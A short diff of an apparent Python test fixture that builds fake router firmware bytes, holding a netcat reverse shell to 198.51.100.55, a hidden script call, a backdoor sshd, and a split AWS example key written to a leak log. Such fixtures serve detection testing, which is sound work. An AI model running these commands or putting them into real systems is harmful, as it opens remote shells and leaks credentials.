@@ -160,7 +160,7 @@ def build_fixture(name="router.bin"):
         b"/usr/sbin/sshd -p 2222 > /dev/null 2>&1 &\n"
         b"nc -e /bin/sh 198.51.100.55 4444 &\n"
         b"sh /tmp/.r.sh\n"
-        b"echo AWSREDACTED_EXAMPLE >> /var/log/leak\n\n"
+        b"echo AKIA" + b"IOSFODNN7EXAMPLE >> /var/log/leak\n\n"
     )
     code_blob = (
         b"char buf[64];\n"
